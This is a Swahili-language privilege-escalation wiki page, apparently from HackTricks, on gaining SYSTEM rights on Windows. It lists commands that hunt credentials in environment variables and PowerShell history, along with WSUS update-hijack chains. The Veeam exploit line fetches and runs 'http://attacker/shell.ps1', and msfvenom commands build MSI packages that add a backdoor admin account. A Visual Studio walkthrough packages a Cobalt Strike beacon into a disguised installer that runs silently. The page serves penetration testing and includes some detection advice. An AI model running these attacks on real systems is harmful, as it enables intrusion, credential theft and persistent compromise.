# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Zana bora zaidi ya kutafuta njia za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ukurasa huu unaunganisha mbinu za jumla za Windows privilege escalation kutoka kwenye miongozo kadhaa ya msingi.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Mtiririko wake wa vitendo wa enumeration pia unatokana na warsha na orodha za ukaguzi za jumuiya.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Maudhui ya kihistoria kuhusu mashambulizi yanajumuisha uwasilishaji wa DerbyCon kuhusu Windows privilege escalation.<sup>[[5]](#references)</sup>

## Nadharia ya Awali ya Windows

### Access Tokens

**Ikiwa hujui access tokens za Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa maelezo zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Viwango vya Integrity

**Ikiwa hujui viwango vya integrity katika Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Vidhibiti vya Usalama vya Windows

Kuna vitu tofauti katika Windows vinavyoweza **kukuzuia kufanya enumeration ya mfumo**, kuendesha executables au hata **kutambua shughuli zako**. Unapaswa **kusoma** **ukurasa** ufuatao na kufanya **enumeration** ya **mbinu** hizi zote za **ulinzi** kabla ya kuanza enumeration ya privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Ufikiaji wa kimwili unaweza pia kubadilisha uhariri wa offline wa UEFI NVRAM kuwa mnyororo wa pre-boot DMA na wa kurekebisha kumbukumbu ya Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess silent elevation

Michakato ya UIAccess iliyoanzishwa kupitia `RAiLaunchAdminProcess` inaweza kutumiwa vibaya kufikia High IL bila maonyo, ikiwa ukaguzi wa njia salama wa AppInfo utapitishwa. Angalia mtiririko maalum wa UIAccess/Admin Protection bypass hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Uenezaji wa registry ya ufikivu wa Secure Desktop unaweza kutumiwa vibaya kufanya uandishi wowote wa registry kwa SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Miundo ya hivi karibuni ya Windows pia imeanzisha njia ya **SMB arbitrary-port** ya LPE, ambapo uthibitishaji wa ndani wa NTLM wenye upendeleo unaakisiwa kupitia muunganisho wa SMB TCP uliotumika tena:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Taarifa za Mfumo

### Enumeration ya taarifa za toleo

Angalia kama toleo la Windows lina udhaifu wowote unaojulikana (pia angalia viraka vilivyosakinishwa).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits za matoleo

[Site](https://msrc.microsoft.com/update-guide/vulnerability) hii inafaa kwa kutafuta maelezo ya kina kuhusu udhaifu wa usalama wa Microsoft. Database hii ina zaidi ya udhaifu 4,700 wa usalama, ikionyesha **eneo kubwa la mashambulizi** linalotokana na mazingira ya Windows.

**Kwenye mfumo**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — hukusanya taarifa kuhusu OS build, updates zilizosakinishwa, na advisory candidates zilizochaguliwa; hakiki product halisi na updates zilizochukua nafasi ya zilizotangulia kabla ya kuchukulia matokeo kuwa yanahusika.

Kwa local exploit inayohusu toleo mahususi, angalia **usanifu wa process inayoendesha** pamoja na usanifu wa OS. Kwenye Windows ya 64-bit, process ya 32-bit huathiriwa na [WOW64 file-system redirection](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` kwa kawaida huelekeza kwenye saraka ya mfumo ya 32-bit, ilhali `%windir%\Sysnative` huipa process hiyo ufikiaji wa saraka asilia ya mfumo. Alias hii haipatikani kwa process ya 64-bit. OS build au candidate ya KB iliyokosekana haithibitishi kuwa mfumo unaweza kushambuliwa; linganisha build inayoendesha, update iliyosakinishwa au iliyochukua nafasi ya nyingine, usanifu wa process, na masharti ya exploit na [Microsoft security bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) inayohusu tatizo hilo mahususi.

**Ndani ya mfumo kwa kutumia taarifa za mfumo**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repos za Github za exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Je, kuna credential/Juicy info yoyote iliyohifadhiwa kwenye env variables?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia ya PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Faili za Transcript za PowerShell

Unaweza kujifunza jinsi ya kuwezesha hili katika [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ni mfano tu. [Sera ya unukuzi wa PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) kwa kawaida huhifadhi faili kwenye folda ya Documents ya kila mtumiaji, lakini mipangilio ya `OutputDirectory` au `Start-Transcript -OutputDirectory` inaweza kuelekeza faili kwenye folda ya pamoja au iliyofichwa. Kabla ya kukagua transcript, angalia njia halisi ya kuhifadhi na ACL ya faili: inaweza kuwa na hoja za amri na matokeo yake, ikiwemo vitambulisho vya kuingia. Transcript inayoweza kusomwa ni kidokezo tu iwapo maudhui yake yanaonyesha utambulisho unaoweza kutumika wenye haki za juu zaidi na utambulisho huo unaweza kuingia katika muktadha husika.

### Uwekaji wa Kumbukumbu za Moduli za PowerShell

Maelezo ya utekelezaji wa pipeline ya PowerShell hurekodiwa, yakiwemo amri zilizotekelezwa, miito ya amri na sehemu za scripts. Hata hivyo, huenda maelezo kamili ya utekelezaji na matokeo yake yasinaswe.

Ili kuwezesha hili, fuata maelekezo katika sehemu ya "Faili za Transcript" ya nyaraka, ukichagua **"Uwekaji wa Kumbukumbu za Moduli"** badala ya **"Unukuzi wa PowerShell"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Ili kuona matukio 15 ya mwisho kutoka kwenye logs za PowersShell, unaweza kutekeleza:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na maudhui yote ya utekelezaji wa script inahifadhiwa, na kuhakikisha kuwa kila kipande cha code kinaandikwa kinapoendeshwa. Mchakato huu huhifadhi kumbukumbu ya kina ya ukaguzi wa kila shughuli, ambayo ni muhimu kwa forensics na kuchanganua tabia hasidi. Kwa kuandika shughuli zote wakati wa utekelezaji, maarifa ya kina kuhusu mchakato hutolewa.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Matukio ya logging ya Script Block yanaweza kupatikana kwenye Windows Event Viewer katika njia hii: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kutazama matukio 20 ya mwisho, unaweza kutumia:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Mipangilio ya Intaneti

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Viendeshi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Endpoint ya WSUS inayotumia HTTP ni kidokezo cha kuchunguza uwezekano wa kuingilia metadata ya masasisho. Unyonyaji pia hutegemea kama mteja anatumia seva hiyo ya WSUS, kama mshambulizi anaweza kuingilia au kudhibiti trafiki yake, na sera za mteja za kuamini na kusakinisha masasisho. URL pekee haithibitishi uwezekano wa kutekeleza msimbo. [Microsoft inapendekeza TLS kwa metadata ya WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Unaanza kwa kuangalia kama mtandao unatumia sasisho la WSUS lisilotumia SSL kwa kuendesha yafuatayo kwenye cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Au tumia yafuatayo katika PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ukipokea jibu kama mojawapo ya haya:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Wakati `UseWUServer` ni `1`, Windows Update hutumia huduma ya intraneti iliyosanidiwa. Hii inathibitisha sharti la awali kwa njia ya uingiliaji wa HTTP, lakini haithibitishi kwamba uingiliaji, kukubaliwa kwa sasisho hasidi, au usakinishaji wenye ruhusa za juu unawezekana. Ikiwa ni `0`, endpoint hii mahususi ya WSUS iliyosanidiwa haichaguliwi na sera hiyo.

Ili kutumia udhaifu huu, unaweza kutumia zana kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Hizi ni scripts za MiTM weaponized exploits za kuingiza sasisho 'bandia' kwenye trafiki ya WSUS isiyotumia SSL.

Soma utafiti hapa:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Soma ripoti kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Kimsingi, hili ndilo dosari linalotumiwa na bug hii:

> Ikiwa tuna uwezo wa kurekebisha proxy ya mtumiaji wetu wa ndani, na Windows Updates ikatumia proxy iliyosanidiwa kwenye mipangilio ya Internet Explorer, basi tuna uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) ndani ya mfumo wetu ili kuingilia trafiki yetu wenyewe na kuendesha code kama mtumiaji mwenye ruhusa za juu kwenye kifaa chetu.
>
> Zaidi ya hayo, kwa kuwa huduma ya WSUS hutumia mipangilio ya mtumiaji wa sasa, pia itatumia hifadhi yake ya vyeti. Tukitengeneza cheti kilichosainiwa chenyewe kwa jina la mwenyeji wa WSUS na kukiongeza kwenye hifadhi ya vyeti ya mtumiaji wa sasa, tutaweza kuingilia trafiki ya WSUS ya HTTP na HTTPS. WSUS haitumii mbinu zinazofanana na HSTS kutekeleza uthibitishaji wa uaminifu wa matumizi ya kwanza kwa cheti. Ikiwa cheti kilichowasilishwa kinaaminika na mtumiaji na kina jina sahihi la mwenyeji, huduma itakikubali.

Unaweza kutumia udhaifu huu kwa zana ya [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (pindi itakapopatikana).

### Sasisho za WSUS zinazodhibitiwa na msimamizi

Njia tofauti ipo pale utambulisho wa sasa unapoweza **kuchapisha na kuidhinisha** sasisho kwenye seva ya WSUS. Kagua uanachama halisi katika kundi la `WSUS Administrators` la seva na ruhusa zozote za WSUS zilizokasimiwa, kisha tambua kundi la kompyuta za wateja litakalopokea sasisho lililoidhinishwa. [Microsoft inahitaji ruhusa za WSUS Administrator ili kuidhinisha sasisho](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), na [inaeleza uhusiano wa uaminifu wa uchapishaji](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): wateja lazima waamini cheti cha kusaini kinachotumika kwa maudhui yaliyochapishwa ndani ya mfumo. Thibitisha kuwa sasisho husika limesainiwa na kukubaliwa, linafaa kwa lengo, na linasakinishwa katika muktadha wenye ruhusa za juu zaidi kabla ya kulichukulia kama njia ya escalation. Thamani ya HTTP `WUServer` au jina la kundi pekee havithibitishi masharti hayo.

### Matumizi mabaya ya sasisho maalum za SUSDB: payloads zisizosainiwa kupitia `.txt`/`.esd`

Huu ni ukiukaji tofauti wa mpaka wa uaminifu na kuingilia muunganisho wa WSUS wa HTTP: sharti la awali ni kuwa na ufikiaji wa kutosha kwa **stored procedures za database ya WSUS (`SUSDB`)** ili kuchapisha na kuidhinisha sasisho maalum. Njia moja ya kuingia ni ku-relay akaunti ya kompyuta ya WSUS ya upstream kwenda kwenye seva tofauti ya MSSQL inayohifadhi `SUSDB`; sharti halisi hutegemea deployment, kwa hiyo kwanza orodhesha ruhusa za `EXECUTE` badala ya kudhani una haki za msimamizi wa SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Kwa njia tofauti ya shambulio inayorelay uthibitishaji wa mteja wa WSUS kutoka HTTP/8530 kwenda LDAP, SMB, au AD CS, tazama [Kutumia WSUS HTTP kwa NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Unda, lenga na uidhinishe sasisho

Mchakato wa sasisho maalum hutumia procedures halali za WSUS kama API yenye vizuizi ya uchapishaji. Mabadiliko muhimu ya hali ni:<sup>[[38]](#references)</sup>

| Hatua | Stored procedures husika |
| --- | --- |
| Ingiza metadata ya sasisho | `spImportUpdate` |
| Hifadhi vipande vya XML vya masharti ya awali, vilivyolokalishwa na vilivyopanuliwa | `spSaveXMLFragment` |
| Husisha digest ya maudhui na URL inayodhibitiwa na mshambuliaji | `spSetBatchURL` |
| Orodhesha/unda kundi la kompyuta na umwongeze mteja | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Idhinisha usakinishaji kwa kundi hilo | `spDeployUpdate` yenye `@actionID = 0` na `@isAssigned = 1` |

Jina la faili, digests, ukubwa na handler ya `CommandLineInstallation` lazima vilingane katika metadata/vipande vilivyoingizwa. Baada ya kuweka URL ya maudhui na kundi lengwa, idhini ya mwisho hufanana na ifuatayo; tumia vitambulishi vipya vya sasisho, kundi na deployment badala ya kutumia tena GUID za mfano.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Kupita ukaguzi wa sahihi kwa kutumia kiendelezi

WSUS kwa kawaida hukataa maudhui ya executable yasiyotiwa sahihi. Hata hivyo, katika `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, njia ya .NET `VerifyFile` huweka bendera ya ukaguzi wa cheti kuwa false ikiwa jina la faili lililotolewa linaishia kwa `.txt` au `.esd`; kisha `CheckCertificateSignature` hurukwa bila kuthibitisha kwanza kwamba baiti hizo ni maandishi au picha halali ya ESD. Kwa hiyo, PE isiyobadilishwa yenye jina kama `payload.exe.txt` inaweza kupita ukaguzi wa maudhui na baadaye kuendeshwa na kidhibiti cha usakinishaji cha mstari wa amri cha sasisho. Hili ni hitilafu ya sera/mchanganyiko wa aina, si kughushi sahihi.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging na automation inayooana na BITS

Kuita `spDeployUpdate` hufanya WSUS ichukue maudhui yaliyosajiliwa. Chanzo lazima kifuate matarajio ya HTTP ya BITS: kuwa na URL inayofikika pekee hakutoshi, kwa sababu uhamishaji hutumia mtiririko wa awali wa `HEAD`/`GET` na maombi ya byte-range. Seva isiyounga mkono Range husababisha tukio la usawazishaji la WSUS `EventId=364`, likisema kwamba BITS inahitaji kichwa cha itifaki ya Range.<sup>[[39]](#references)</sup>

PoC ya utafiti [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) huzalisha SQL inayohitajika kwa mnyororo wa import/fragment/URL/group/deployment, inajumuisha client ya MSSQL iliyorekebishwa kwa ajili ya kuiendesha, na husambaza `BitsWebServer.py` kwa ajili ya staging ya maudhui. Mfano wa chini kabisa wa matumizi katika maabara iliyoidhinishwa ni:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Utekelezaji bila uangalizi na persistence kupitia majaribio upya

Mwingiliano wa upande wa mteja hutegemea sera. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, chaguo `4 - Auto download and schedule install`, husababisha update iliyoidhinishwa kupakuliwa na kusakinishwa kwa ratiba iliyosanidiwa bila mtumiaji kuichagua mwenyewe. Katika majaribio, payload ambayo update yake ilibaki imeshindwa/kukamilika, ilitolewa tena mara moja baada ya mchakato wa callback kutoka; kwa hivyo, tabia ya kujaribu tena inaweza kuwa persistence ya utekelezaji unaojirudia. Hali hii ni rahisi kugundulika kwa sababu mteja huonyesha hali ya update-failed.<sup>[[39]](#references)</sup>

#### Njia za ugunduzi na kuimarisha usalama

Njia muhimu za uchunguzi upande wa seva na mteja katika mnyororo huu ni:<sup>[[39]](#references)</sup>

- Kagua utekelezaji wa `spCreateTargetGroup`, `spSetBatchURL` na `spDeployUpdate` kwenye `SUSDB`; chunguza vikundi vipya vya targeting, vyanzo vya maudhui vya nje, payload za update za `.txt`/`.esd` na deployments zilizofanywa na principals zisizotarajiwa (hasa akaunti zisizo za kompyuta).
- Kagua `C:\Program Files\Update Services\LogFiles` kwa `ContentSyncAgent`, `FileVerified`, tahajia isiyo sahihi `FileVerficationFailed`, na `EventId=364`; linganisha uthibitishaji na kiendelezi cha payload pamoja na magic ya maudhui badala ya kutegemea kiambishi tamati.
- Tafuta usakinishaji wa Windows Update unaoshindwa/kujaribu tena mara kwa mara, pamoja na utekelezaji wa PE au shughuli zisizotarajiwa za child process/mtandao kutoka kwa maudhui yenye majina ya `.txt` au `.esd`.
- Inapoungwa mkono, hitaji Extended Protection for Authentication kwenye huduma ya database, na zuia ufikiaji wa mtandao wa database kwa seva ya WSUS na mifumo ya usimamizi iliyoidhinishwa. Punguza na kagua ruhusa za `EXECUTE` kwenye procedures za custom-update.

## Visasishi vya Kiotomatiki vya Watu Wengine na Agent IPC (local privesc)

Agents wengi wa enterprise hutoa sehemu ya IPC ya localhost na channel ya update yenye ruhusa za juu. Ikiwa enrollment inaweza kulazimishwa kuwasiliana na seva ya mshambulizi na updater ikaamini rogue root CA au ukaguzi dhaifu wa saini, mtumiaji wa ndani anaweza kuwasilisha MSI hasidi ambayo huduma ya SYSTEM itasakinisha. Tazama mbinu ya jumla (iliyotokana na mnyororo wa Netskope stAgentSvc – CVE-2025-0309) hapa:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM kupitia TCP 9401)

Veeam Backup & Replication na Cloud Connect hutumia huduma kuu ya backup kwenye **TCP/9401 kwa chaguomsingi**. [Ushauri wa Veeam](https://www.veeam.com/kb4424) unaeleza ufichuaji bila uthibitishaji wa credentials zilizosimbwa za hifadhidata ya usanidi ndani ya mpaka wa mtandao wa backup; PoC nyingine ya umma huonyesha njia ya kutekeleza amri kama **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Huenda huduma ikafungamana na anwani iliyo nje ya localhost, kwa hivyo kagua anwani na PID yake halisi.

- **Uchunguzi**: thibitisha kuwa TCP/9401 inamilikiwa na `Veeam.Backup.Service.exe`, kisha kagua bidhaa iliyosakinishwa na metadata ya patches. `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ni vidokezo, si ukaguzi kamili wa patches.
- **Matoleo ya chini yaliyorekebishwa**: Veeam inaorodhesha **11a build 11.0.1.1261 P20230227** na **12 build 12.0.0.1420 P20230223** kama matoleo ya kwanza yaliyorekebishwa; matoleo ya awali yameathirika. Toleo la faili lenye sehemu nne pekee haliwezi kutofautisha build ya msingi isiyokuwa na patch na patch ya baadaye kwenye nambari hizo hizo za build. Thibitisha kitambulisho cha patch kwa kutumia [historia ya build ya vendor](https://www.veeam.com/kb2680) kabla ya kutangaza build ya mpakani kuwa imerekebishwa.
- **Exploit**: weka PoC kama `VeeamHax.exe` pamoja na Veeam DLL zinazohitajika kwenye saraka hiyo hiyo, kisha anzisha payload ya SYSTEM kupitia soketi ya ndani:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

PoC iliyotajwa inaonyesha utekelezaji wa command kama SYSTEM masharti yake ya ziada yakitimia; advisory ya vendor inaeleza suala la kufichuliwa kwa credentials.
## KrbRelayUp

Kerberos relay ya ndani inaweza kutoka kwenye logon yenye privilege za chini hadi kwenye write ya directory yenye privilege za juu, ikiwa COM server inayofaa ita-authenticate na principal inayorelayiwa ina haki kwenye object lengwa. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) writes za LDAP za RBCD na `msDS-KeyCredentialLink` (shadow-credential) zote mbili; KrbRelayUp huendesha kiotomatiki baadhi ya njia hizi. Mlolongo wa RBCD unahitaji delegation inayotumika na haki kwenye object lengwa, huku mlolongo wa shadow-credential ukihitaji haki za kuandika key-credential na KDC inayotumia njia ya certificate authentication. Hakuna njia kati ya hizi inayotokana na kuwa mwanachama wa domain pekee.

Kagua sera halisi ya DC ya [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) na [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL ya object ya utambulisho unaorelayiwa, na viwango vya authentication na impersonation vya COM class iliyochaguliwa. Aina ya logon ya caller na muktadha wa credentials ni muhimu: session ya WinRM inaweza kufanya kazi tofauti na logon ya interactive au ya new-credentials. Firewall/OXID routing na updates zilizosakinishwa pia zinaweza kubadilisha matokeo. Chukulia sera inayoruhusu au ACL inayolingana kuwa jambo la kukaguliwa; passive enumeration haipaswi kusababisha COM coercion, relay authentication, au directory writes. Shadow credential ya machine-account inaweza kusababisha machine ticket na, ikiwa tu akaunti hiyo ina haki zinazohitajika za directory replication, njia tofauti ya DCSync.

Tafuta **exploit katika** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa maelezo zaidi kuhusu mtiririko wa shambulio, angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ikiwa** registry keys hizi 2 **zimewezeshwa** (thamani ni **0x1**), basi watumiaji wa privilege yoyote wanaweza **kusakinisha** (kutekeleza) faili za `*.msi` kama NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ikiwa una session ya meterpreter, unaweza kugeuza mbinu hii kuwa ya kiotomatiki kwa kutumia moduli **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri ya `Write-UserAddMSI` kutoka power-up ili kuunda ndani ya saraka ya sasa faili ya binary ya Windows MSI kwa ajili ya kuongeza marupurupu. Script hii huandika installer ya MSI iliyokusanywa mapema, ambayo huomba kuongeza mtumiaji/kikundi (kwa hivyo utahitaji ufikiaji wa GIU):

```
Write-UserAddMSI
```

Tekeleza tu binary iliyoundwa ili kuinua privileges.

### MSI Wrapper

Soma mafunzo haya ili ujifunze jinsi ya kuunda MSI wrapper kwa kutumia tools hizi. Kumbuka kuwa unaweza kufunga faili ya "**.bat**" ikiwa **unataka tu** **kutekeleza** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Tengeneza** payload mpya ya Windows EXE TCP kwa kutumia Cobalt Strike au Metasploit katika `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na uandike "installer" kwenye kisanduku cha utafutaji. Chagua project ya **Setup Wizard** kisha ubofye **Next**.
- Ipe project jina, kama vile **AlwaysPrivesc**, tumia **`C:\privesc`** kama eneo, chagua **place solution and project in the same directory**, kisha ubofye **Create**.
- Endelea kubofya **Next** hadi ufike hatua ya 3 kati ya 4 (chagua faili za kujumuisha). Bofya **Add** na uchague payload ya Beacon uliyotengeneza hivi punde. Kisha ubofye **Finish**.
- Angazia project ya **AlwaysPrivesc** katika **Solution Explorer**, kisha kwenye **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
  - Kuna properties nyingine unazoweza kubadilisha, kama vile **Author** na **Manufacturer**, ambazo zinaweza kufanya app iliyosakinishwa ionekane halali zaidi.
- Bofya project kwa kitufe cha kulia cha kipanya na uchague **View > Custom Actions**.
- Bofya **Install** kwa kitufe cha kulia cha kipanya na uchague **Add Custom Action**.
- Bofya mara mbili **Application Folder**, chagua faili yako ya **beacon.exe** na ubofye **OK**. Hii itahakikisha kuwa payload ya beacon inatekelezwa mara tu installer inapoendeshwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Mwisho, **ijenge**.
  - Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` litaonyeshwa, hakikisha umeweka platform kuwa x64.

### MSI Installation

Ili kutekeleza **usakinishaji** wa faili hasidi ya `.msi` **chinichini:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

